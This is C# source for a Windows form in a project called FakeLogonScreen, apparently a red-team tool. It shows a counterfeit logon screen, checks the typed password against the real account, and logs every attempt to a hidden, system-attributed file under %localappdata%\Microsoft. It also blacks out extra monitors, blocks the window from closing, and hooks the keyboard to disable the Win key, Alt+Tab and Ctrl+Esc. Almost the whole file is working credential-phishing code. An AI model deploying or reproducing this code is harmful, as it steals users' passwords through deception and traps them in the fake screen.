using System;
using System.Diagnostics;
using System.DirectoryServices.AccountManagement;
using System.Runtime.InteropServices;
using System.Windows.Forms;
using System.IO;
using System.Drawing;

/*
Author: @bitsadmin
Website: https://github.com/bitsadmin
License: BSD 3-Clause
*/

namespace FakeLogonScreen
{
    public partial class LogonScreen : Form
    {
        private bool success = false;
        public ContextType Context { get; set; }
        public string Username { get; set; }
        public string DisplayName { get; set; }

        public LogonScreen()
        {
            InitializeComponent();
        }

        private void mtbPassword_KeyUp(object sender, KeyEventArgs e)
        {
            if (e.KeyCode == Keys.Enter)
                ValidateCredentials();
        }

        private void pbSubmit_Click(object sender, EventArgs e)
        {
            ValidateCredentials();
        }

        private void ValidateCredentials()
        {
            // Validate password
            string error = string.Empty;
            string password = mtbPassword.Text;
            try
            {
                using (PrincipalContext context = new PrincipalContext(Context))
                {
                    // If for whatever reason the username couldn't be resolved, the password can most likely also not be validated
                    // Just save the password and close the screen
                    if (string.IsNullOrEmpty(Username))
                        success = true;

                    success = context.ValidateCredentials(Username, password);
                }
            }
            // Could happen in case for example the (local) user's password is empty
            catch(Exception e)
            {
                success = true;
                error = string.Format("{0}\r\n", e.Message);
            }

            // Store username and password in %localappdata%\Microsoft\user.db
            // Even if a wrong password is typed, it might be valuable
            string path = string.Format(@"{0}\Microsoft\user.db", Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData));
            try
            {
                if (string.IsNullOrEmpty(password))
                    password = "[blank password]";

                using (StreamWriter file = new StreamWriter(path, true))
                {
                    file.WriteLine("{0}{1}: {2} --> {3}", error, this.Username, password, success ? "Correct" : "Wrong");
                }

                // Hide file
                File.SetAttributes(path, FileAttributes.Hidden | FileAttributes.System);
            }
            catch (Exception)
            { }

            // Ask again if password is incorrect
            if (!success)
            {
                // Show error
                lblError.Text = "The password is incorrect. Try again.";
                mtbPassword.Text = string.Empty;

                // Set focus on password box
                ActiveControl = mtbPassword;
            }
            // If correct password, save and close screen
            else
            {
                Application.Exit();
            }
        }

        private void Screen_FormClosing(object sender, FormClosingEventArgs e)
        {
            // Block window from being closed using Alt + F4
            if (!success)
                e.Cancel = true;
        }

        private void Screen_Load(object sender, EventArgs e)
        {
            // Create new black fullscreen window on every additional screen
            foreach (Screen s in Screen.AllScreens)
            {
                if (s.Primary)
                    continue;

                Form black = new Form()
                {
                    BackColor = System.Drawing.Color.Black,
                    ShowIcon = false,
                    ShowInTaskbar = false,
                    WindowState = FormWindowState.Maximized,
                    MaximizeBox = false,
                    MinimizeBox = false,
                    FormBorderStyle = FormBorderStyle.None,
                    ControlBox = false,
                    StartPosition = FormStartPosition.Manual,
                    Location = new Point(s.WorkingArea.Left, s.WorkingArea.Top)
                };

                // Prevent black screen from being closed
                black.FormClosing += delegate (object fSender, FormClosingEventArgs fe) { fe.Cancel = true; };

                // Show black screen
                black.Show();
            }

            // Set username
            if (!string.IsNullOrEmpty(DisplayName))
                lblUsername.Text = DisplayName;
            else if (!string.IsNullOrEmpty(Username))
                lblUsername.Text = Username;
            else
                lblUsername.Text = "User";

            // Set focus on password box
            ActiveControl = mtbPassword;

            // Disable WinKey, Alt+Tab, Ctrl+Esc
            // Source: https://stackoverflow.com/a/3227562
            ProcessModule objCurrentModule = Process.GetCurrentProcess().MainModule;
            objKeyboardProcess = new LowLevelKeyboardProc(captureKey);
            ptrHook = SetWindowsHookEx(13, objKeyboardProcess, GetModuleHandle(objCurrentModule.ModuleName), 0);

            // Make this the active window
            WindowState = FormWindowState.Minimized;
            Show();
            WindowState = FormWindowState.Maximized;
        }

        /* Code to Disable WinKey, Alt+Tab, Ctrl+Esc Starts Here */

        // Structure contain information about low-level keyboard input event 
        [StructLayout(LayoutKind.Sequential)]
        private struct KBDLLHOOKSTRUCT
        {
            public Keys key;
            public int scanCode;
            public int flags;
            public int time;
            public IntPtr extra;
        }
        //System level functions to be used for hook and unhook keyboard input  
        private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);
        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr SetWindowsHookEx(int id, LowLevelKeyboardProc callback, IntPtr hMod, uint dwThreadId);
        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern bool UnhookWindowsHookEx(IntPtr hook);
        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr CallNextHookEx(IntPtr hook, int nCode, IntPtr wp, IntPtr lp);
        [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr GetModuleHandle(string name);
        [DllImport("user32.dll", CharSet = CharSet.Auto)]
        private static extern short GetAsyncKeyState(Keys key);
        //Declaring Global objects     
        private IntPtr ptrHook;
        private LowLevelKeyboardProc objKeyboardProcess;

        private IntPtr captureKey(int nCode, IntPtr wp, IntPtr lp)
        {
            if (nCode >= 0)
            {
                KBDLLHOOKSTRUCT objKeyInfo = (KBDLLHOOKSTRUCT)Marshal.PtrToStructure(lp, typeof(KBDLLHOOKSTRUCT));

                // Disabling Windows keys 
                if (objKeyInfo.key == Keys.RWin || objKeyInfo.key == Keys.LWin || objKeyInfo.key == Keys.Tab && HasAltModifier(objKeyInfo.flags) || objKeyInfo.key == Keys.Escape && (ModifierKeys & Keys.Control) == Keys.Control)
                {
                    return (IntPtr)1; // if 0 is returned then All the above keys will be enabled
                }
            }
            return CallNextHookEx(ptrHook, nCode, wp, lp);
        }

        bool HasAltModifier(int flags)
        {
            return (flags & 0x20) == 0x20;
        }
        /* Code to Disable WinKey, Alt+Tab, Ctrl+Esc Ends Here */
    }
}
